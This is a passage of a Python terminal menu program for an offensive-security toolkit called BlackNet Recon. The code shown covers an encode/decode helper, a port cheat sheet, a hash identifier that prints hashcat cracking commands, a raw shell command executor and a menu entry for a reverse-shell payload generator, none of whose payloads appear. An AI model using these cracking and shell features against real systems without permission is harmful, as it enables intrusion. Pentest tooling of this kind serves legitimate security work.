        elif op_key == "urle":   result = urllib.parse.quote(text, safe="")
        elif op_key == "urld":   result = urllib.parse.unquote(text)
        elif op_key == "hexe":   result = text.encode().hex()
        elif op_key == "hexd":   result = bytes.fromhex(text).decode()
        elif op_key == "htmle":
            result = text.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;").replace('"',"&quot;").replace("'","&#x27;")
        elif op_key == "rot13":  result = codecs.encode(text, "rot_13")
        elif op_key == "md5":    result = hashlib.md5(text.encode()).hexdigest()
        elif op_key == "sha1":   result = hashlib.sha1(text.encode()).hexdigest()
        elif op_key == "sha256": result = hashlib.sha256(text.encode()).hexdigest()
    except Exception as ex:
        console.print(f"\n  [{T['error']}]Error: {ex}[/{T['error']}]")
        pause()
        return

    console.print()
    console.print(Panel(
        f"  [{T['info']}]Input:   [/{T['info']}] [{T['cmd']}]{text}[/{T['cmd']}]\n"
        f"  [{T['info']}]Output:  [/{T['info']}] [{T['gen_out']}]{result}[/{T['gen_out']}]",
        title=f"[{T['tool_hdr']}]  {op_name}  [/{T['tool_hdr']}]",
        border_style=T["border"], padding=(1, 2)
    ))
    pause()


# ══════════════════════════════════════════════════════════════════
#  INTERACTIVE FEATURE: PORT REFERENCE TABLE
# ══════════════════════════════════════════════════════════════════

def port_reference():
    """Display colour-coded port reference table with pentest notes."""
    print_banner()
    divider("PORT REFERENCE — COMMON SERVICES & ATTACK NOTES")
    console.print()

    tbl = Table(
        title=f"[{T['menu_title']}]Common Ports Cheat Sheet[/{T['menu_title']}]",
        box=box.DOUBLE_EDGE, border_style=T["border"],
        header_style=f"bold {T['section']}", show_lines=True, expand=True,
    )
    tbl.add_column("PORT",    style=T["port_num"],  justify="right", width=7, no_wrap=True)
    tbl.add_column("PROTO",   style=T["menu_idx"],  width=7,  no_wrap=True)
    tbl.add_column("SERVICE", style=T["port_svc"],  width=18, no_wrap=True)
    tbl.add_column("PENTEST NOTES",  style=T["port_note"])

    for p in PORT_REFERENCE:
        tbl.add_row(str(p["port"]), p["proto"], p["svc"], p["note"])

    console.print(tbl)
    console.print()
    pause()


# ══════════════════════════════════════════════════════════════════
#  INTERACTIVE FEATURE: HASH IDENTIFIER
# ══════════════════════════════════════════════════════════════════

def hash_identifier():
    """
    Identify hash type by regex matching.
    Shows Hashcat mode number and John format for cracking.
    """
    print_banner()
    divider("HASH IDENTIFIER")
    console.print()

    h = Prompt.ask(f"  [{T['prompt']}]Paste hash[/{T['prompt']}]").strip()
    if not h:
        pause()
        return

    matches = []
    for sig in HASH_SIGNATURES:
        if re.match(sig["regex"], h, re.IGNORECASE):
            matches.append(sig)

    console.print()
    if not matches:
        console.print(Panel(
            f"  [{T['error']}]No signature match found.[/{T['error']}]\n"
            f"  [dim white]Hash: {h}\n"
            f"  Length: {len(h)} chars[/dim white]",
            border_style=T["border"]
        ))
    else:
        tbl = Table(
            title=f"[{T['tool_hdr']}]Hash Analysis Results[/{T['tool_hdr']}]",
            box=box.DOUBLE_EDGE, border_style=T["border"],
            header_style=f"bold {T['section']}", show_lines=True, expand=True,
        )
        tbl.add_column("Possible Hash Type",   style=T["hash_match"],  ratio=35)
        tbl.add_column("Hashcat Mode (-m)",     style=T["hash_mode"],   ratio=20)
        tbl.add_column("John Format (--format)",style=T["cmd"],         ratio=25)
        tbl.add_column("Crack Command",         style=T["cmd_desc"],    ratio=20)

        for m in matches:
            crack = f"hashcat -m {m['hc']} hash.txt rockyou.txt"
            tbl.add_row(m["name"], str(m["hc"]), m["john"], crack)

        console.print(tbl)
        console.print(Panel(
            f"  [{T['info']}]Hash:[/{T['info']}] [{T['cmd']}]{h}[/{T['cmd']}]\n"
            f"  [{T['info']}]Length:[/{T['info']}] [{T['highlight']}]{len(h)} characters[/{T['highlight']}]",
            border_style=T["border2"], padding=(0, 2)
        ))

    console.print()
    pause()


# ══════════════════════════════════════════════════════════════════
#  INTERACTIVE FEATURE: LIVE COMMAND EXECUTOR
# ══════════════════════════════════════════════════════════════════

def run_command():
    """
    Run any shell command directly from the tool.
    Output is displayed inline with a live capture.
    """
    print_banner()
    divider("COMMAND EXECUTOR")
    console.print(Panel(
        f"  [{T['warn']}]Execute system commands directly. For authorized use only.[/{T['warn']}]\n"
        f"  [{T['info']}]Type 'back' to return to main menu.[/{T['info']}]",
        border_style=T["border"], padding=(0, 2)
    ))
    console.print()

    while True:
        cmd = Prompt.ask(
            f"[{T['prompt']}]  blacknet@exec[/{T['prompt']}] [dim white]$[/dim white]"
        ).strip()

        if cmd.lower() in ("back", "exit", "q", "quit", "b"):
            break
        if not cmd:
            continue

        console.print()
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=30
            )
            output = result.stdout + result.stderr
            if output.strip():
                console.print(Panel(
                    f"[{T['gen_out']}]{output.rstrip()}[/{T['gen_out']}]",
                    border_style=T["border2"], padding=(0, 1)
                ))
            else:
                console.print(f"  [{T['info']}](no output)[/{T['info']}]")
            if result.returncode != 0:
                console.print(f"  [{T['error']}]Exit code: {result.returncode}[/{T['error']}]")
        except subprocess.TimeoutExpired:
            console.print(f"  [{T['error']}]Command timed out (30s limit).[/{T['error']}]")
        except Exception as ex:
            console.print(f"  [{T['error']}]Error: {ex}[/{T['error']}]")
        console.print()


# ══════════════════════════════════════════════════════════════════
#  MENU RENDERERS
# ══════════════════════════════════════════════════════════════════

def main_menu():
    """Render the main numbered category + feature menu."""
    console.print()
    divider("MAIN MENU")
    console.print()

    tbl = Table(
        box=box.SIMPLE_HEAVY, border_style=T["border"],
        show_header=False, expand=False, padding=(0, 2)
    )
    tbl.add_column("Num",  style=T["menu_idx"],  justify="right", width=5)
    tbl.add_column("Icon", style="bold",          width=4)
    tbl.add_column("Category",  style=T["menu_item"], width=34)
    tbl.add_column("Description", style=T["menu_desc"])

    for idx, (cat_key, cat) in enumerate(COMMANDS.items(), 1):
        tbl.add_row(f"[{idx}]", cat.get("icon","•"), cat["title"], cat["description"])

    # Divider row
    tbl.add_row("", "", "", "")
    tbl.add_row("[dim red]──[/dim red]", "","", "[dim red]── BUILT-IN TOOLS ────────────────────────────────[/dim red]")
    tbl.add_row("[R]", "🔀", "Reverse Shell Generator", "Generate payloads for 16 languages + encoded variants")
    tbl.add_row("[E]", "🔐", "Encode / Decode",         "Base64, URL, Hex, ROT13, HTML, MD5, SHA256")
    tbl.add_row("[P]", "📋", "Port Reference",          "50+ ports with pentest attack notes")
    tbl.add_row("[H]", "🧬", "Hash Identifier",         "Paste hash → get type, Hashcat mode, John format")
    tbl.add_row("[X]", "⚡", "Command Executor",        "Run any command without leaving BlackNet Recon")
    tbl.add_row("[S]", "🔎", "Search",                  "Full-text search across all commands and tags")
    tbl.add_row("[Q]", "🩸", "Quit",                    "Exit BlackNet Recon")

    console.print(Align.center(tbl))
    console.print()


def category_menu(cat_key: str):
    """Render sub-menu for a category and return list of (key, data) tool tuples."""
    cat = COMMANDS[cat_key]
    console.print()
    divider(f"{cat.get('icon','')}  {cat['title'].upper()}")
    console.print()

    tbl = Table(
        box=box.SIMPLE_HEAVY, border_style=T["border"],
        show_header=False, expand=False, padding=(0, 2)
    )
    tbl.add_column("Num",  style=T["menu_idx"],  justify="right", width=5)
    tbl.add_column("Tool", style=T["menu_item"], width=50)

    tools = list(cat["tools"].items())
    for idx, (_, tool_data) in enumerate(tools, 1):
        tbl.add_row(f"[{idx}]", tool_data["title"])

    tbl.add_row("", "")
    tbl.add_row("[A]", "Show All Tools in This Category")
    tbl.add_row("[B]", "← Back to Main Menu")

    console.print(Align.center(tbl))
    console.print()
    return tools


# ══════════════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ══════════════════════════════════════════════════════════════════

def main():
    """Primary interactive loop."""

    # ── Boot splash ───────────────────────────────────────────────
    print_banner()
    console.print(Panel(
        f"  [{T['warn']}]⚠  LEGAL NOTICE:[/{T['warn']}] [{T['cmd_desc']}]This toolkit is for "
        f"authorized penetration testing, CTF competitions, and educational\n"
        f"  research only. Unauthorized use against systems you do not own or "
        f"have explicit written permission to test is\n"
        f"  illegal and may result in criminal prosecution. The author assumes NO "
        f"liability for misuse.[/{T['cmd_desc']}]",
        border_style="yellow", padding=(0, 1)
    ))
    console.print()

    cat_keys = list(COMMANDS.keys())

    # ── Main loop ─────────────────────────────────────────────────
    while True:
        print_banner()
        main_menu()

        choice = Prompt.ask(
            f"[{T['prompt']}]  blacknet@root[/{T['prompt']}] [dim white]~[/dim white]"
        ).strip().lower()

        # ── Quit ─────────────────────────────────────────────────
        if choice in ("q", "quit", "exit"):
            console.print()
            console.print(Align.center(
                f"[{T['caption']}]▓▒░  Stay sharp. Stay ethical. — BlackNet Recon  ·  {CAPTION}  ░▒▓[/{T['caption']}]"
            ))
            console.print()
            break

        # ── Search ───────────────────────────────────────────────
        elif choice in ("s", "search"):
            console.print()
            q = Prompt.ask(f"  [{T['prompt']}]Search keyword[/{T['prompt']}]").strip()
            if q:
                results = search_commands(q)
                show_search_results(q, results)
                pause()

        # ── Reverse Shell Generator ───────────────────────────────
        elif choice == "r":
            reverse_shell_generator()

        # ── Encode / Decode ───────────────────────────────────────
        elif choice == "e":
            encode_decode_utility()

        # ── Port Reference ────────────────────────────────────────
        elif choice == "p":
            port_reference()

        # ── Hash Identifier ───────────────────────────────────────
        elif choice == "h":
            hash_identifier()

        # ── Command Executor ──────────────────────────────────────
        elif choice == "x":
            run_command()

        # ── Category by number ────────────────────────────────────
        elif choice.isdigit():
            cat_idx = int(choice) - 1
            if 0 <= cat_idx < len(cat_keys):
                selected = cat_keys[cat_idx]

                # ── Category sub-loop ─────────────────────────────
                while True:
                    print_banner()
                    tools = category_menu(selected)
                    tool_data_list = [v for _, v in tools]

                    sub = Prompt.ask(
                        f"[{T['prompt']}]  blacknet@root[/{T['prompt']}] "
                        f"[dim white]{COMMANDS[selected]['title']} ~[/dim white]"
                    ).strip().lower()

                    if sub in ("b", "back"):
                        break
                    elif sub in ("a", "all"):
                        print_banner()
                        for td in tool_data_list:
                            show_tool(td)
                        pause()
                    elif sub.isdigit():
                        ti = int(sub) - 1
                        if 0 <= ti < len(tool_data_list):
                            print_banner()
                            show_tool(tool_data_list[ti])
                            pause()
                        else:
                            console.print(f"  [{T['error']}]Invalid tool number.[/{T['error']}]")
                            time.sleep(1)
                    else:
                        console.print(f"  [{T['error']}]Type a number, A to show all, or B to go back.[/{T['error']}]")
                        time.sleep(1)
            else:
                console.print(f"  [{T['error']}]Invalid category number (1-{len(cat_keys)}).[/{T['error']}]")
                time.sleep(1)
        else:
            console.print(f"  [{T['error']}]Unknown input. Enter a number, R/E/P/H/X/S, or Q.[/{T['error']}]")
            time.sleep(1)


# ══════════════════════════════════════════════════════════════════
#  SCRIPT ENTRY
# ══════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print()
        console.print(f"\n  [{T['error']}]  Interrupted — Exiting BlackNet Recon.[/{T['error']}]")
        console.print()
        sys.exit(0)